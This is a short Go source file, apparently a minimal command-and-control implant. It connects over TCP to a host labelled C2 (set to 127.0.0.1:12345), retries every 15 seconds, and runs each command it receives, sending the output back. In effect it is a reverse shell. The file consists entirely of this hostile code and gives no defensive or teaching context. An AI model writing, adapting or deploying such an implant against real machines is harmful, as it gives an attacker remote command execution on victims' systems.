// Author : Nemuel Wainaina

package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"strings"
	"time"
)

const (
	C2 string = "127.0.0.1:12345"
)

func main() {
	conn, _ := connect_home(C2)

	for {
		cmd, _ := bufio.NewReader(conn).ReadString('\n')
		cmd = strings.TrimSpace(cmd)
		send_msg(conn, exec_cmd(cmd))
	}
}

func connect_home(C2 string)  (net.Conn, error) {
	conn, err := net.Dial("tcp", C2)
	if err != nil {
		time.Sleep(15e9)
		return connect_home(C2)
	}
	return conn, nil
}

func send_msg(conn net.Conn, msg string) {
	fmt.Fprintf(conn, "%s", msg)
}

func exec_cmd(cmd string) string {
	result, err := exec.Command(cmd).Output()
	if err != nil {
		return err.Error()
	}
	return string(result)
}